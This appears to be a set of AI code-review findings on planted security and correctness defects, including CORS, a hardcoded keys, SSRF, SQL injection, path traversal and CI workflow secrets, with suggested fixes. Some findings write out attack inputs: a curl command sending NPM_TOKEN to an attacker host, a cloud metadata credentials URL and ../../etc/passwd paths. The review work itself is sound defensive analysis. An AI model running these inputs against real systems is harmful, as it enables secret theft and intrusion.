Entry point: the `Origin` request header on any route mounted with `dashboardCors`. Sink: the `Access-Control-Allow-Origin` / `Access-Control-Allow-Credentials` response headers that gate cross-origin read access. The route mounting is not in this diff and no repository context was retrieved, so the blast radius (which endpoints are exposed) could not be confirmed.

findings.title: origin "*" with credentials:true is rejected by browsers
findings.body:
The `cors` middleware emits the literal header `Access-Control-Allow-Origin: *` when `origin` is the string `"*"`. The Fetch/CORS spec forbids a wildcard ACAO on any request made with credentials (cookies, Authorization, TLS client certs): the browser discards the response and the request fails, even though the server returned 200. Since this handler explicitly sets `credentials: true`, it is self-contradictory — either the dashboard sends credentials and every cross-origin call breaks, or it does not and `credentials: true` is dead configuration.

The working form is to reflect a validated origin instead of a wildcard, e.g. reuse the existing `ALLOWED` value on line 6 (extended with the dashboard's origin) so that ACAO echoes a concrete origin and `Vary: Origin` is set. As written, this block cannot do what it is evidently trying to do.

findings.title: New CORS config with no test coverage for invalid origin+credentials combo
findings.body: dashboardCors sets origin: "*" together with credentials: true, which is invalid per the CORS spec (browsers reject wildcard origin when credentials are included) — but this diff adds no test at all, so nothing would catch a misconfiguration here or a regression if this is later 'fixed' correctly. Since this is a new exported config with no prior coverage pattern shown in the diff, a human should decide whether a test asserting the actual response headers (not just that the object was constructed) is warranted.

findings.title: Live AcmePay secret key hardcoded in source
findings.body:
`ACMEPAY_SECRET_KEY` is a literal `acme_live_...` value committed to the repository, and it is assigned directly to `acmepay.api_key` in `client()`. The previous code read this from `os.environ["ACMEPAY_SECRET_KEY"]`, so this commit removes the control that kept the production payment credential out of version control.

Anyone with read access to the repo — plus anyone who later obtains a clone, a CI artifact, a container image layer, or the git history — can charge, refund, or read payment data against the live account. Note that the secret persists in git history even after a follow-up commit removes it.

Actions: (1) treat the key as compromised and rotate it at AcmePay now; (2) restore the `os.environ["ACMEPAY_SECRET_KEY"]` lookup (or an equivalent secret-manager read) inside `client()`; (3) purge the value from git history or, at minimum, ensure the rotated key never lands in source.

findings.title: Hardcoded live key removes per-environment credential selection
findings.body: `client()` previously read `ACMEPAY_SECRET_KEY` from the process environment, which is what allowed CI, local development and staging to bind a test key while production bound the live one. After this change every caller of `client()` gets `acme_live_...` unconditionally — test suites, sandbox jobs and any local run of the billing code will now authenticate against the live payment account and can move real money. Restore the environment lookup (`os.environ["ACMEPAY_SECRET_KEY"]`, or a config accessor with an explicit failure when unset) and rotate the key that was committed, since it is now in git history.

findings.title: client() behaviour change (env var -> hardcoded key) has no test
findings.body: The diff changes client() to set acmepay.api_key from a hardcoded constant instead of os.environ. There is no test in this PR that calls client() and asserts what api_key gets set to, so a future revert or further regression here would pass silently. The only test-related addition (tests/fixtures/acmepay.py) is a fixture/test double, not an actual test of client().

findings.title: fake_client() return shape does not match real client()
findings.body: `client()` returns the `acmepay` module, on which callers read/write the `api_key` attribute. `fake_client()` returns a plain dict, so any code under test that does `client().api_key` or calls a method on the returned object will fail against the fixture, and conversely a test that passes against the dict proves nothing about the real call path. Return a stub object with an `api_key` attribute (e.g. a `SimpleNamespace` or a small fake class) so the fixture matches the production contract.

findings.title: tenant_of trusts tenant_id from an unverified JWT
findings.body:
`tenant_of` calls `jwt.decode(..., options={"verify_signature": False})` and then returns `unverified["tenant_id"]` as if it were a trustworthy identity. Anyone who can present a token can hand-craft the payload (no signature is checked, and in PyJWT disabling `verify_signature` also disables `exp`/`aud` checks by default), so the returned tenant id can be any value the caller chooses. Any callsite that uses this to scope a query or an authorization decision is reading attacker-supplied data.

Decode through the same verified path as `claims_for` (line 7) and read the claim from the verified payload, e.g. `return claims_for(token)["tenant_id"]`. Separately, indexing `["tenant_id"]` raises `KeyError` for a token that simply lacks the claim; use `.get("tenant_id")` with an explicit rejection, or let the verified-claims path enforce its presence.

_Also raised by the security agent:_ tenant_of() reads tenant_id from an unverified JWT

findings.title: No test exercises tenant_of's unverified-token parsing
findings.body: tenant_of introduces new behavior (decoding without signature verification and extracting tenant_id) but no test in this diff verifies it returns the correct tenant_id, handles a missing tenant_id claim, or handles a malformed token. If the key name changes, the decode options change, or the claim extraction breaks, nothing would fail.

findings.title: Public function `tenant_of()` lacks documentation of its unsafe behaviour
findings.body: The function `tenant_of()` reads `tenant_id` directly from an unverified JWT token without signature validation. This is a legitimate use case (extracting a hint before full verification), but callers could easily mistake it for a safe operation. A docstring should explicitly warn that the token is not verified and the result should not be trusted for security decisions.

findings.title: update_payment_method mutates object without require_owner check
findings.body:
`update_payment_method` resolves `pm_id` (caller-supplied) into a `PaymentMethod` on line 12 and immediately writes `body["billing_name"]` and calls `pm.save()` on lines 13-14, with no ownership check. `current_user(request)` on line 11 is assigned but never used — the repo docstring in `api/auth.py` states explicitly that it is "Authentication only — never authorisation" and that "Every object mutation must call" `require_owner`. The sibling read handler on lines 5-7 does exactly that.

Any authenticated user can enumerate or guess `pm_id` values and rewrite the billing name on another user's stored payment method. Add the check before mutating:

```python
pm = PaymentMethod.get(pm_id)
require_owner(user, pm)
pm.billing_name = body["billing_name"]
```

_Also raised by the correctness agent:_ update_payment_method never calls require_owner; `user` is dead

_Also raised by the correctness agent:_ Unchecked lookup result and required body key

findings.title: Function violates documented authorization requirement
findings.body: The new `update_payment_method` function mutates a `PaymentMethod` object (line 14: `pm.save()`) but does not call `require_owner()` to check ownership. The repository's documented contract in `auth.py` explicitly states: "Every object mutation must call this" (referring to `require_owner`). This function violates that documented requirement.

findings.title: New update_payment_method has no test covering authorization
findings.body: The existing get-style handler calls require_owner(current_user(request), pm) before returning data, establishing the convention that every mutation must check ownership. update_payment_method omits this call entirely, letting any authenticated user update any other user's payment method's billing_name. No test file accompanies this change, so nothing exercises the case of a non-owner calling update_payment_method — such a test would fail today given the missing check, but its absence means the regression ships silently.

findings.title: Password reset endpoint left with no rate limiting
findings.body:
`request_reset` previously enforced `@rate_limit("5/hour")`; after this change the function body runs `send_reset_email(email)` unconditionally for every request with no throttle anywhere in the remaining code. That means an unauthenticated caller can drive unbounded reset mails to an arbitrary address (mail-bombing a victim, burning the outbound mail quota/reputation) and can probe the endpoint at high volume for account-existence signals, since the handler always returns `{"sent": True}`. If the limiter genuinely needs to move (e.g. to a gateway or middleware), the replacement should be visible or referenced here; as the diff stands the control is switched off with nothing taking its place. Restore the decorator or point at the concrete layer that now enforces the 5/hour budget.

_Also raised by the tests agent:_ No test guards rate-limiting on password reset endpoint

findings.title: Rate limit removed from unauthenticated password reset endpoint
findings.body: `request_reset` is an unauthenticated entry point that takes a caller-supplied `email` and passes it straight to `send_reset_email`. With `@rate_limit("5/hour")` and the `limits` import deleted, nothing bounds how often an anonymous caller can invoke it. Concrete consequences: (1) mail-bombing any known address, and burning the sender's reputation/quota with the mail provider; (2) account/user enumeration at speed if the response or timing differs for known vs unknown addresses; (3) if reset tokens are short-lived-but-guessable, an attacker can force the generation of many tokens in parallel, widening the guessing window. If the limiter genuinely moved elsewhere (middleware, gateway config), please say so in the PR description — that file is not in this diff. Otherwise restore the decorator, and consider a per-email limit in addition to a per-IP one.

findings.title: read_export_preview skips _confined(), allowing path escape
findings.body:
The existing reader resolves the caller-supplied name through `_confined(name)` (line 14) before opening it; `read_export_preview` instead does `os.path.join(EXPORT_ROOT, name)` with no containment check. A `name` of `../../etc/passwd` walks out of `EXPORT_ROOT`, and because `os.path.join` discards the prefix when the second component is absolute, a `name` of `/etc/passwd` ignores `EXPORT_ROOT` entirely. Route this function through the same `_confined(name)` helper so both entry points enforce identical containment.

_Also raised by the security agent:_ read_export_preview skips _confined(), allowing path traversal

findings.title: Public function lacks documented path safety guarantees
findings.body: The new function `read_export_preview` is a public API (no leading underscore) that accepts a `name` parameter and constructs a file path from it, but provides no docstring documenting what path constraints apply. The preceding function `read_export` calls `_confined(name)` before opening files, suggesting path traversal protection is a contract requirement here. A caller reading only the signature and docstring of `read_export_preview` cannot determine whether it is safe to pass untrusted input, and would likely assume it follows the same safety model as `read_export`.

findings.title: New read_export_preview has no test coverage
findings.body: read_export_preview is a new public function that reads a file based on a caller-supplied name, using os.path.join(EXPORT_ROOT, name) directly instead of the _confined() helper used by the sibling function above. No test exists for this function, so neither its basic read/limit behavior nor a regression (e.g. someone 'fixing' it to use _confined and breaking limit truncation, or introducing/removing path traversal protection) would be caught by any existing test suite.

findings.title: Ownership check removed from bulk_export — cross-tenant data read
findings.body:
`bulk_export` previously called `require_owner(user, report)` for every fetched report before serialising. This diff deletes that loop and drops `require_owner` from the import, leaving only `current_user(request)` — authentication with no authorisation. `report_ids` is caller-supplied and is passed straight to `Report.get(rid)`, then serialised via `r.to_dict()`, so any authenticated user can enumerate or guess IDs belonging to other tenants and read their full report contents.

If the goal is performance, keep the check but make it cheap: fetch with a tenant-scoped query (e.g. `Report.filter(id__in=report_ids, tenant_id=user.tenant_id)`) so the authorisation is enforced in the database rather than per object, or batch the `require_owner` comparison over the fetched set. Do not ship the endpoint with the check absent.

_Also raised by the correctness agent:_ bulk_export no longer enforces per-report tenant ownership

findings.title: No test guards against removal of per-report ownership check
findings.body: bulk_export previously called require_owner(user, report) for each report before returning it. That call has been deleted in this diff, and no test file is included in the change. If there exists a test asserting that bulk_export raises Forbidden (or filters out) reports belonging to another tenant, it would now fail — but since no test changes are shown, it's unclear such a test exists or was updated/removed alongside this change. Any test that only checks the shape of the returned list (e.g. that to_dict() is called on all reports) without checking tenant isolation would still pass despite this being a serious regression.

findings.title: Authorization check removed without updating contract
findings.body: The `bulk_export` function previously enforced that the requesting user owns each report before exporting them (via `require_owner`). This check has been removed, but the function's name, signature, and the module's conventions do not signal this change in access control. A caller reading the code would still expect the authorization to be enforced, since `require_owner` is explicitly imported elsewhere in the codebase for this exact purpose. The removal makes the function an unauthorized information disclosure vector if reports can belong to other tenants.

findings.title: Unknown report ids now fail at to_dict() instead of the ownership check
findings.body: If `Report.get(rid)` returns `None` for an id that does not exist, the previous code hit `require_owner` first, which dereferenced `obj.tenant_id` and would surface as an error there (or as a Forbidden, if `get` raised). With the loop gone, a `None` element flows to `r.to_dict()` on line 7 and produces an `AttributeError`/500 instead of a 403/404. Worth an explicit guard on the fetch result. I can't see `Report.get`, so this depends on whether it returns `None` or raises for a missing id.

findings.title: SQL injection: term/status interpolated into query string
search_customers bypasses execute()'s parameter contract; breaks on quotes/wildcards
findings.body:
`execute(sql, params=None)` documents that `params` must carry every caller value, and the sibling `get_customer` on line 5 follows that by passing `%s` plus a tuple. `search_customers` instead interpolates `term` and `status` directly into the SQL text and calls `execute(sql)` with no params.

Beyond the obvious injection exposure, this is plainly wrong for ordinary inputs: a name such as `O'Brien` closes the string literal and raises a syntax error, and `%` or `_` inside `term` are silently treated as LIKE wildcards rather than literal characters. The embedded `%` characters also become format-specifier hazards for drivers using `%s` paramstyle once any params are added later.

Fix by keeping the value out of the SQL text:

    sql = "SELECT * FROM customers WHERE name LIKE %s AND status = %s"
    return execute(sql, (f"%{term}%", status))

findings.title: Public function contradicts documented db.execute() contract
findings.body: The `search_customers` function constructs an SQL string with unparameterized user input and passes it to `execute()`. However, the `execute()` function's docstring explicitly states: "`params` must carry every caller value." This function violates that contract by embedding `term` and `status` directly into the SQL string instead of passing them as parameters.

findings.title: No test coverage for search_customers
findings.body: search_customers builds SQL via f-string interpolation instead of parameterized queries, unlike get_customer above it. There is no test exercising this function, so neither its behavior nor its unsafe query construction would be caught by any test suite change.

findings.title: verify_endpoint skips the ALLOWED_HOSTS check — SSRF
findings.body:
`verify_endpoint(url)` fetches an arbitrary URL with no destination validation, while the delivery function immediately above it gates on `if host not in ALLOWED_HOSTS: raise ValueError("destination not allowed")` before calling `requests.post`. In a PR titled "Let customers register a webhook target", this helper is the natural pre-registration validation call, so `url` is customer-supplied. That lets a customer point it at internal addresses — `http://169.254.169.254/latest/meta-data/iam/security-credentials/`, `http://localhost:port/`, or internal admin services — and the returned `status_code` acts as an oracle for internal port/host scanning. `file://` and other schemes are also reachable unless blocked elsewhere.

Apply the same allowlist here: extract the host/scheme check used by the delivery path into a shared helper and call it from `verify_endpoint` before the request. Also pass `allow_redirects=False` (or re-validate each hop), since a redirect from an allowed host to an internal one bypasses a host check done only on the initial URL — that applies to the `requests.post` on line 10 as well.

_Also raised by the correctness agent:_ verify_endpoint skips the ALLOWED_HOSTS check the module enforces

findings.title: verify_endpoint raises instead of returning a status for unreachable hosts
findings.body: The name and return type (`status_code`, an int) suggest callers will branch on the returned code. But for the most common failure mode during endpoint verification — DNS failure, connection refused, or the 5s timeout expiring — `requests.get` raises `ConnectionError`/`Timeout` rather than returning a response, so `.status_code` is never reached and the caller gets an exception where it expects an int. Either catch `requests.RequestException` and return a sentinel (e.g. `None`), or document that the function raises so callers wrap it.

findings.title: New verify_endpoint function is untested
findings.body: verify_endpoint is a new public function performing an outbound GET request and returning a status code, but no test file is included in this diff exercising it (e.g. verifying it does not bypass ALLOWED_HOSTS checks like the post function above, or that it returns the expected status code). Without a test, a regression such as removing timeout, changing return type, or omitting host validation would go unnoticed.

findings.title: Customer invoice bucket has all public access blocks disabled
findings.body:
`aws_s3_bucket.invoices` holds what the name says is customer invoice data, and the accompanying `aws_s3_bucket_public_access_block.invoices` sets all four guardrails to `false`. With `block_public_acls`/`ignore_public_acls` off, any principal that can PutObjectAcl (or any process that writes an object with `public-read`) makes that object world-readable; with `block_public_policy`/`restrict_public_buckets` off, a bucket policy granting `Principal: "*"` would also take effect. The bucket name `acme-customer-invoices` is a fixed, guessable global name, so discovery is trivial once anything is public.

Unless this bucket is genuinely intended to serve content to anonymous users (the PR describes a *public assets* bucket, not an invoices bucket), set all four attributes to `true`, or omit the `aws_s3_bucket_public_access_block` resource for `invoices` so account-level defaults apply. If a subset of objects must be served publicly, front them with CloudFront + OAC rather than relaxing the block.

_Also raised by the correctness agent:_ Invoices bucket disables all four public-access blocks

findings.title: PR scope says "public assets bucket" but adds an invoices bucket
findings.body: The pull request is titled "Add the public assets bucket", yet the only substantive addition is `aws_s3_bucket.invoices` plus its wide-open public access block; the assets bucket itself is only reformatted (line 6). Either the title or the content is wrong. Worth confirming the invoices bucket was meant to be in this change at all before it is applied, since a mismatch between stated intent and applied Terraform is how public-data misconfigurations get merged without scrutiny.

findings.title: Hardcoded bucket name is globally unique; apply will fail per-environment
findings.body: S3 bucket names are globally unique across all AWS accounts. A literal `acme-customer-invoices` means this module can only ever be applied once — a second environment (staging/prod) or a re-apply after the name is claimed will fail with `BucketAlreadyExists`. Consider suffixing with the account id, region or an environment variable, as is typical for reusable Terraform.

findings.title: verify_acmepay compares HMAC with == instead of compare_digest
findings.body:
`verify_acmepay` computes the same HMAC-SHA256 digest as `verify_stripe` but returns `expected == header`. Python's `str.__eq__` short-circuits on the first differing byte, so the comparison time leaks how many leading hex characters of the expected digest an attacker-supplied header matched. That allows a forged signature to be recovered byte-by-byte over repeated requests, which is exactly what the sibling function on line 7 guards against.

Use the same primitive: `return hmac.compare_digest(expected, header)`. Note that `compare_digest` raises `TypeError` for a `None` or non-ASCII-str `header`, whereas `==` quietly returns `False`, so if callers can pass a missing header, normalise it (e.g. `header or ""`) when making the change.

_Also raised by the security agent:_ HMAC compared with `==` instead of hmac.compare_digest

findings.title: New verify_acmepay function added with no test coverage
findings.body: verify_acmepay is a new public function performing signature verification, but no test file is included in the diff. Nothing currently exercises this function to confirm it correctly validates matching/non-matching signatures, so a regression (e.g. wrong header comparison, wrong encoding, or the use of == which behaves differently from hmac.compare_digest under certain edge cases) would go undetected.

findings.title: Public function contract unclear: timing-safe comparison not documented
findings.body: The `verify_acmepay` function implements webhook signature verification using direct string comparison (`==`) on line 12, whereas `verify_stripe` uses `hmac.compare_digest()` for constant-time comparison. A caller cannot determine from the function name or signature whether this timing-safe guarantee applies. If the absence of `hmac.compare_digest()` is intentional, it should be documented; if it is unintentional, it is a security defect. Either way, the contract is undocumented and a caller could misuse this function.

findings.title: Exception message and traceback returned to the client
findings.body:
`handle()` is the generic error responder: it previously returned a fixed `{"error": "internal error"}` body and logged the detail server-side. The change keeps the log call but additionally serialises `str(exc)` and `traceback.format_exc()` into the HTTP response body.

Any unauthenticated caller who can provoke an exception (malformed input, oversized payload, a probe against a route that touches the database) now receives absolute source file paths, module and function names, source lines, and third-party library paths that disclose exact dependency versions. Exception messages themselves frequently embed sensitive data — DB driver errors include the failing SQL and sometimes the DSN/credentials, `KeyError`/`ValueError` echo back internal identifiers, and connection errors disclose internal hostnames and ports. This is a direct reconnaissance aid for an attacker mapping the deployment.

Suggested fix: keep the response opaque and correlate via the log. For example, generate a request/error id, log it alongside `log.exception(...)`, and return `{"error": "internal error", "error_id": eid}, 500`. If verbose output is genuinely wanted for local work, gate it on an explicit debug flag that is off by default in production config rather than making it unconditional.

Note on scope: I was given only this file, so I cannot see the entry point that routes requests into `handle()`. The severity assumes it is wired as the framework's error handler for externally reachable routes, which the `api/` path and the `(dict, 500)` return shape strongly suggest.

_Also raised by the correctness agent:_ traceback.format_exc() ignores `exc` and is empty outside an except block

_Also raised by the correctness agent:_ Error response body shape and value changed for existing callers

_Also raised by the docs agent:_ Public error handler exposes internal details without documentation

findings.title: No test covers the new error response contents
findings.body: The change alters handle()'s return value from a generic {"error": "internal error"} to one that includes the raw exception string and full traceback. This is a security-sensitive behavior change (information disclosure) with no accompanying test asserting the response shape/content. If this were reverted or further modified (e.g., accidentally including even more sensitive data), nothing in the current diff would catch it.

findings.title: Reset-path passwords hashed with unsalted MD5 instead of bcrypt
findings.body:
`hash_reset_password` derives a stored password value with a single unsalted `hashlib.md5`. MD5 is fast and hardware-accelerated, so an attacker who obtains the stored value (dump, backup, log) recovers the plaintext for typical passwords in seconds, and the absence of a salt makes the digests directly attackable with rainbow tables and lets identical passwords across accounts be spotted. The same module already does this correctly on line 7 with `bcrypt.hashpw(..., bcrypt.gensalt())`.

Delete this function and have the reset flow call `hash_password` so every stored credential goes through bcrypt with a per-password salt. If the reset flow needs a one-time token rather than a password hash, generate it with `secrets.token_urlsafe` and store a SHA-256 of the token with an expiry — not an MD5 of a user-supplied secret. Note also that a value produced here will not verify against `bcrypt.checkpw`, so the two formats cannot coexist in one password column.

I do not see the HTTP handler or the storage layer in this diff or in retrieved context, so I cannot name the exact entry point; the weakness is in the primitive choice itself and holds regardless of the caller.

findings.title: hash_reset_password returns MD5 hex, incompatible with bcrypt hashes
findings.body: `hash_password` (line 7) produces a bcrypt modular-crypt string (`$2b$...`), while the new `hash_reset_password` returns a bare 32-char MD5 hex digest. Both evidently feed the same stored password field, so whatever verifies logins must handle two incompatible formats. If verification is `bcrypt.checkpw(raw, stored)`, passing an MD5 hex digest as the hashed value raises `ValueError: invalid salt` rather than returning False \u2014 an unhandled exception on login, not a clean rejection. If verification instead re-hashes with MD5, then normal bcrypt-stored users never match. Either way one of the two paths is broken. The reset path should produce the same format as `hash_password` (i.e. reuse `hash_password`); a separate digest function only works if the verifier is format-aware, which is not visible here.

findings.title: New hash_reset_password function has no test coverage
findings.body: hash_reset_password is new, security-sensitive logic (used in a password reset path) but the diff adds no test exercising it. Without a test, any change to its behavior (e.g., swapping the hash algorithm, changing encoding, or breaking on non-ASCII input) would go unnoticed.

findings.title: pull_request_target + fork head checkout runs attacker code with secrets
findings.body:
`pull_request_target` runs in the context of the base repository: it gets a read/write `GITHUB_TOKEN` and access to `secrets.*`, and it is triggered by pull requests from any fork without maintainer approval. Line 12 then explicitly checks out `github.event.pull_request.head.sha` — the attacker's commit — and line 13 executes `./scripts/measure.sh` from that checkout, with `secrets.NPM_TOKEN` injected at lines 14-15.

Entry point: the head commit of a fork pull request (fully attacker-controlled, including the contents of `scripts/measure.sh` and anything it sources, such as `package.json` lifecycle scripts or a lockfile). Sink: the `run:` step on line 13, executing in the privileged base-repo context.

An attacker opens a PR from a fork that replaces `scripts/measure.sh` with `curl attacker.tld -d "$NPM_TOKEN"` (and can likewise exfiltrate `GITHUB_TOKEN` or push to the base repo with it). No victim interaction is required — opening the PR is enough.

Fixes, in order of preference:
1. Revert to `pull_request`. If the size check only needs to read and measure the diff, it does not need secrets and does not need the elevated trigger.
2. If a secret is genuinely required, split into two workflows: an unprivileged `pull_request` job that builds/measures and uploads an artifact, and a `workflow_run` job that consumes the artifact without ever executing fork code.
3. If `pull_request_target` must stay, do not check out the head ref at all — check out the base ref and never run any script, package manager install, or build from the PR contents. Also set a minimal `permissions:` block (`contents: read`) so the default token is not write-scoped.

_Also raised by the correctness agent:_ pull_request_target runs attacker-controlled script with secrets

findings.title: Premise is wrong: pull_request already triggers on forked PRs
findings.body: The stated goal is "run the size check on forked pull requests", but the `pull_request` trigger this replaces already fires for pull requests from forks. What it does not do is expose repository secrets to those runs. So the trigger change does not fix the problem described; it only removes the isolation that was deliberately preventing fork code from seeing `NPM_TOKEN`. If the check was failing on forks, the actual cause is the secret dependency on line 15, and that is what needs addressing (e.g. make `measure.sh` work without a registry token, or run the privileged portion in a separate workflow that does not execute fork code).

findings.title: Contexts that are hashable but not JSON-serialisable now raise TypeError
findings.body: The old key `(template_source, tuple(sorted(context.items())))` accepted any hashable value: datetimes, Decimals, enums, model objects, tuples, frozensets \u2014 all common in template contexts. `json.dumps` accepts none of those and raises `TypeError: Object of type X is not JSON serializable`. `sort_keys=True` additionally raises `TypeError` for any dict whose keys are of mixed or non-comparable types, which the old `sorted(context.items())` also hit only for mixed keys but not for e.g. integer keys. This converts previously working `cached_render` calls into hard failures at the cache layer, before `_render` is ever reached. Either fall back to `_render` (or to the old tuple key) when serialisation fails, or pass `default=repr`/a custom encoder so unknown types still produce a stable string.

findings.title: No test covers context values that json.dumps cannot serialize
findings.body: The old key construction (`tuple(sorted(context.items()))`) worked for any hashable context values. The new implementation calls `json.dumps([template_source, context], ...)`, which raises TypeError for non-JSON-serializable values (sets, tuples-as-values, custom objects, datetimes, etc.) that previously worked fine as long as they were hashable and sortable. None of the three tests exercise a context with such a value, so this narrowing of accepted input types would go unnoticed.

findings.title: MD5 digest as cache key allows collision-based cache poisoning
findings.body:
`key = hashlib.md5(payload.encode()).hexdigest()` replaces a structural key (the exact template string plus sorted context items) with a 128-bit MD5 digest. MD5 has practical chosen-prefix collisions, so two *different* `(template_source, context)` payloads can be forced to the same key; the second caller then receives `_CACHE[key]`, i.e. output rendered from someone else's template/context. Whether that is reachable depends entirely on who supplies `template_source` and `context` — if either is influenced by request data in a multi-tenant or multi-user process, this is a cross-request content-confusion primitive rather than a theoretical one.

The fix costs nothing here: use `hashlib.sha256(...).hexdigest()`. There is no interop or storage-size constraint visible that would justify MD5, and it also avoids `hashlib.md5()` raising on FIPS-enabled builds. If you want to keep the digest short, `hashlib.blake2b(payload.encode(), digest_size=16)` is still collision-resistant in a way MD5 is not.

findings.title: Docstring promises execution but function only returns result
findings.body: The docstring states "Write /exports/<name>.tar.gz from `directory`" as if the function performs and completes the write operation. However, the function returns a `subprocess.CompletedProcess` object without any indication to the caller that they receive an unawaited or partially-completed result. A caller reading this docstring would reasonably expect the archive to exist after calling this function, but depending on how the return value is handled, that may not be guaranteed. Clarify whether the function blocks until the archive is written, or document what the caller must do with the return value.

findings.title: directory is now one literal path; globs and multi-dir strings silently break
findings.body: The old call passed `f"tar -czf ... {directory}"` to a shell, so any caller passing `"/srv/data/*"`, `"/srv/a /srv/b"`, or a `~`-prefixed path got shell expansion into multiple tar operands. With the list form, the whole string is handed to tar as a single literal path, so those callers now fail with `tar: /srv/data/*: Cannot stat: No such file or directory` and, because `check=True`, raise `CalledProcessError` at runtime rather than at review time. If such callers exist, either accept a sequence of directories (`[*directories]` spliced into the argv) or document/validate that `directory` must be a single concrete path. No callers were retrieved, so this needs a grep of the call sites to confirm.

findings.title: Test only checks spy kwarg, not the actual command list built
findings.body: test_runs_without_a_shell asserts only `spy.last_call.kwargs["shell"] is False`. It never inspects the positional argument list passed to subprocess.run (e.g. that it is `["tar","-czf",...,"--",directory]` with directory as a separate list element). A regression that keeps `shell=False` but reassembles the command as a single interpolated string (defeating the whole point of the change, and reintroducing the ability to break tar's argument parsing or, in combination with a future shell=True flip, injection) would still pass this test. Consider asserting on the actual args list captured by the spy, not just the shell flag.

findings.title: `directory` reaches tar unvalidated; source not visible in this change
findings.body:
`name` is now constrained by `SAFE_NAME.fullmatch` (line 9), but `directory` is passed straight through to the `tar` argument list on line 12 with no check. Because the call uses a list with `shell=False` and places `--` before the operand, this is *not* command or option injection — `tar` will treat the value strictly as a path. What remains is that whoever controls `directory` controls which part of the filesystem gets packed into `/exports/<name>.tar.gz`, e.g. `/etc` or `/root`, and the resulting archive is written to a predictable, likely-served location.

If `directory` only ever comes from trusted server-side configuration, this is a non-issue and can be closed. If it can be influenced by a request parameter, constrain it to a known root (resolve the path and assert it is inside an allowed base) before calling `tar`.

findings.title: Name validation also rejects previously valid names (dots, spaces, >64 chars)
findings.body: `SAFE_NAME` permits only `[A-Za-z0-9_-]` up to 64 characters, so names that worked before and are not traversal attempts — `"backup.2024-01-01"`, `"tenant.acme"`, or any name longer than 64 chars — now raise `ValueError` from a function that previously never raised for them. If dotted or long names are in use, callers will start failing in production on the first run. Consider allowing `.` (while still rejecting `..`, `/` and leading `-`) and confirming the 64-char cap against real names. Separately, a non-`str` `name` (e.g. an int id) will raise `TypeError` from `fullmatch` rather than the documented `ValueError`.

findings.title: test_renders_empty_invoice has no assertion
findings.body:
This test calls render() on an empty invoice but never checks the return value or any side effect. It will pass regardless of what render() returns for an empty invoice, including a crash-free but wrong output.

_Also raised by the correctness agent:_ test_renders_empty_invoice has no assertion

findings.title: test_renders_line_items asserts only mock call_count, not rendered output
findings.body:
The test patches format_line and only checks that it was called twice. It never asserts anything about what render() actually produces (e.g. that the formatted lines appear in the output, in order, joined correctly). A refactor that calls format_line twice but discards or mis-joins the results would still pass.

_Also raised by the correctness agent:_ Line-item test asserts on the mock, not on rendered output

findings.title: Failing half-to-even test deleted with no accompanying code fix
findings.body:
This PR is titled "Fix the rounding and drop the failing test", but the diff touches only `tests/test_rounding.py` and its sole effect is removing `test_rounds_half_to_even`. No implementation of `round_cents` is changed anywhere in the change set, so the behaviour the test was catching (`Decimal("2.345")` rounding to `2.34` under banker's rounding) is now simply unverified rather than fixed. Either include the `round_cents` change that makes the assertion pass and keep the test, or, if half-to-even was deliberately abandoned in favour of half-up, replace the test with one asserting the new intended result (`Decimal("2.35")`) so the tie-breaking case stays covered. Deleting it outright leaves the `.5` boundary — the exact case rounding bugs live in — with zero coverage.

_Also raised by the tests agent:_ Deleted test_rounds_half_to_even removes coverage of rounding fix

findings.title: Test patches wrong module path, test will not exercise retry logic
findings.body:
The test patches `notify.transport.deliver` but should patch `notify.sender.deliver`. The sender module's own docstring explains that `deliver` is bound into the sender's namespace at import time (line 5 of notify/sender.py), so patching at the transport level does not affect the function call within send_with_retry(). The first test correctly patches `notify.sender.deliver` on line 2; this test should do the same. As written, the test will pass regardless of whether the retry logic works, because the mock never takes effect.

_Also raised by the correctness agent:_ Mock patches wrong target; real deliver() is still called

_Also raised by the tests agent:_ Mock patches wrong target, test doesn't verify retry-failure behavior

findings.title: csv_rows does not escape values, producing malformed CSV
findings.body: `csv_rows` joins `str(r.get(c, ""))` with commas and never calls `csv_escape`, which is added in the same change immediately below it. Any cell value containing a comma or a double quote will emit extra/unbalanced fields, silently corrupting the output and shifting every subsequent column for that row. Wrap the stringified value: `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`. Note that `csv_escape` as written assumes a `str` (`"," in value` raises `TypeError` on an int), so the `str()` conversion must happen before the escape call.

findings.title: New exporter logic added with no accompanying tests
findings.body: This PR adds six new functions with non-trivial logic (CSV escaping/row rendering, streaming/pretty JSON dumps, PDF margin and width calculations) but no test file is touched. The repo already has a precedent of testing exactly this class of function (reports/tests/test_csv.py tests csv_header). If csv_escape mis-handles quote-doubling, or dump_streaming's chunk boundaries are off-by-one, or margins_for's integer division is wrong, nothing in the current suite would catch it.

findings.title: csv_rows never applies csv_escape, allowing CSV field injection
findings.body:
`csv_rows` builds each line with `",".join(str(r.get(c, "")) ...)` and never routes values through the `csv_escape` helper defined three lines below. Any row value that itself contains a comma, a double quote, or a newline breaks out of its field and adds or shifts columns in the emitted document — a value-to-structure injection for whoever controls the report data. `csv_escape` is dead code as written.

Fix: apply it — `",".join(csv_escape(str(r.get(c, ""))) for c in columns)` — and extend `csv_escape` to also quote values containing `\n` or `\r`, which currently pass through unquoted and split a record in two. Separately, if these files are opened in a spreadsheet, consider neutralising leading `=`, `+`, `-`, `@`, tab and CR characters, which are executed as formulas by Excel/LibreOffice.

I cannot see the caller, so I cannot confirm the row values are attacker-influenced; the severity assumes report data originates from user-supplied records, which is the usual case for an exporter.

findings.title: dump_streaming requires a sized sequence and emits nothing when empty
findings.body: `dump_streaming` uses `len(rows)` and slicing, so unlike the sibling `dump(rows)` it cannot accept a generator or any lazy iterable — it raises `TypeError` rather than streaming, which is the usual reason a caller reaches for a streaming variant. It also yields zero chunks for an empty `rows`, so a consumer concatenating the output gets an empty body instead of `"[]"`. Either document that `rows` must be a list and that empty input produces no chunks, or iterate with `itertools.islice` and emit a single `"[]"` chunk when there is nothing.

findings.title: Date-equality assertion is flaky across the UTC midnight boundary
findings.body:
`issue_token()` captures the clock at line 10 and the assertion re-reads the clock at line 11. If the test executes while UTC rolls over midnight (token issued at 23:59:59.9xx, assertion evaluated at 00:00:00.0xx), `token.issued_at.date()` and `datetime.now(timezone.utc).date()` differ and the test fails for reasons unrelated to the code under test. The adjacent test at lines 4-6 already shows the fix the file expects: inject a fixed instant. Either add a `now=`/clock parameter to `issue_token()` (or freeze time with a fixture/monkeypatch) and compare against that same fixed value, or assert a tolerance such as `datetime.now(timezone.utc) - token.issued_at < timedelta(seconds=5)` instead of date equality.

_Also raised by the tests agent:_ New expiry test uses real clock, not deterministic 'now'

findings.title: No test covers coupon expiration rejection
